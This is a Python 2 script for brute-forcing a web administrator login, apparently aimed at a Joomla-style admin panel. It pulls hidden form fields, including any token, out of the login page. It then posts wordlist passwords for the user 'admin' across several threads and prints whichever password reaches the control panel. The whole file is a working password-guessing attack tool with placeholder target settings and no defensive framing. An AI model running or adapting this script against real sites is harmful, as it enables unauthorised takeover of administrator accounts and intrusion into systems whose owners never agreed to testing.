import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser
from content_bruter import build_wordlist

# settings
user_thread = 10
username = "admin"
wordlist_file = "/word/list/file.txt"
resume = None

# target specific settings
target_url = "http://target.url/administrator/index.php"
target_post = "http://target.url/administrator/index.php"

username_field = "username"
password_field = "passwd"

# when successfully logged in, this text will be included in the response
success_check = "Administration - Control Panel"


class Bruter(object):

    def __init__(self, username, words, target_url, target_post,
                 username_field = "username", password_field="passwd"):

        self.username = username
        self.password_q = words
        self.target_url = target_url
        self.target_post = target_post
        self.username_field = username_field
        self.password_field = password_field

        self.found = False

        print "Finished setting up for: %s" % username

    def run_bruteforce(self, n_thread=10):

        for i in range(n_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):

        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

            response = opener.open(self.target_url)

            page = response.read()

            print "Trying: %s : %s (%s left)" % (self.username, brute, self.password_q.qsize())

            # parse out the hidden fields
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            # add our username and password fields
            post_tags[self.username_field] = self.username
            post_tags[self.password_field] = brute

            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(self.target_post, login_data)

            login_result = login_response.read()

            if success_check in login_result:
                self.found = True

                print "[*] Bruteforce successful."
                print "[*] Username: %s" % self.username
                print "[*] Password: %s" % brute
                print "[*] Waiting for other threads to exit..."


class BruteParser(HTMLParser):

    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                elif name == "value":
                    tag_value = value

            if tag_name is not None:
                self.tag_results[tag_name] = tag_value


words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username=username, words=words, target_url=target_url, target_post=target_post,
                    username_field=username_field, password_field=password_field)
bruter_obj.run_bruteforce(n_thread=user_thread)
